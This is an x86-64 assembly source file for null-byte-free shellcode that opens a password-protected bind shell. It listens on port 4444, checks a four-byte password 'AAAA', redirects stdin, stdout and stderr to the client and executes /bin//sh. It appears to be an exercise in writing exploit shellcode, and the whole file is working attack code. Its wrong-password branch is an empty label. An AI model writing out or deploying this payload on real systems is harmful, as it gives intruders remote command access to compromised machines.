global _start
_start:

; Constants
AF_INET     equ 0x2
BINSH       equ '/bin//sh'
PASSWORD    equ 'AAAA'
PORT        equ 0x5c11
SIZE_STRUCT equ 0x10
SOCK_STREAM equ 0x1

; syscalls
SYS_ACCEPT  equ 0x2b
SYS_BIND    equ 0x31
SYS_DUP2    equ 0x21
SYS_EXECVE  equ 0x3b
SYS_LISTEN  equ 0x32
SYS_SOCKET  equ 0x29

_init_socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; syscall number 41

    ; To prevent nullbytes I used the push pop technique and cdq to zero out rdx
    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    cdq

    SYSCALL

_bind:
    ; struct sockaddr = {AF_INET; PORT; 0x0; 0x0}
    ; bind(sockfd, const struct sockaddr *addr, 16)
    
    push rdx ; sin_zero
    add dx, 0x5c11
    shl rdx, 16
    add dx, 2
    push rdx
    push rsp
    pop rsi

    push rax
    pop rdi
    push SIZE_STRUCT
    pop rdx

    push SYS_BIND
    pop rax

    SYSCALL

_listen:
    ; listen(fd, 2)
    
    push rax
    pop RSI
    inc RSI
    push SYS_LISTEN
    pop RAX

    SYSCALL

_accept:
    ; accept(sockfd, struct sockaddr *addr, 16)

    push rsp ; Reuse old struct
    pop rsi
    push SIZE_STRUCT
    push RSP
    pop RDX
    push SYS_ACCEPT
    pop RAX

    SYSCALL

_read_pw:
    ; read(fd, *buf, 4)

    add RSI, 8 ; Make it point to sin_zero of sockaddr
    push RAX
    pop RDI
    xor al, al
    push 0x4
    pop RDX

    SYSCALL

_auth:

    cmp dword[rsi], PASSWORD
    jne _burn

_dup2:
   ; dup2(client, STDIN)
   ; dup2(client, STDOUT)
   ; dup2(client, STERR)

    push 3 
    pop rsi

_loop:
    
    dec esi
    push SYS_DUP2
    pop rax
    SYSCALL

    jne _loop

_execve:
    ; execve('/bin//sh', NULL, NULL)

    push rax
    pop rdx      

    push rax    
    mov rax, BINSH
    push rax           
    push rsp ; get a pointer to binsh
    pop rdi           

    xor rax, rax
    mov al, SYS_EXECVE 
    syscall

_burn:
    ; Raise a segfault to close the connection on wrong password
